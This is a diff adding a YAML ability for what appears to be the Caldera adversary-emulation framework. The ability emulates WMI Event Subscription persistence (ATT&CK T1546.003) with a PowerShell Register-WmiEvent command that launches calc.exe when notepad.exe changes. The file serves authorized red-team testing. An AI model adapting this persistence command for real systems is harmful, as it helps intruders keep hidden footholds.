@@ -1,0 +1,33 @@
+- tactic: persistence
+  technique_name: 'Event Triggered Execution: WMI Event Subscription'
+  technique_id: T1546.003
+  name: WMI Event Subscription Persistence
+  description: This ability creates a WMI event subscription to achieve persistence
+    on the target system.
+  executors:
+  - name: windows
+    platform: psh
+    command: powershell -Command "Register-WmiEvent -Query 'SELECT * FROM __InstanceModificationEvent
+      WITHIN 60 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name="notepad.exe"'
+      -Action { Start-Process calc.exe }"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: stockpile
+  delete_payload: true
+  id: 06b7177d-4d40-4b58-a5b5-0d5e0e400c3b
